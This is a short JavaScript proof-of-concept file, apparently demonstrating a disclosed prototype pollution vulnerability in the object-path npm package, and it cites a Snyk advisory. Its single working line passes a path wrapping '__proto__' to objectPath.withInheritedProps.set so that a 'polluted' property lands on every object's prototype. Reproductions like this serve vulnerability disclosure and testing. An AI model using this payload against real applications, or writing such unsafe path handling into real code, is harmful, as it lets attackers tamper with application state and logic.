//https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453
 
  const objectPath = require("object-path");

   
  objectPath.withInheritedProps.set({}, [["__proto__"], "polluted"], "yes");
// End of file
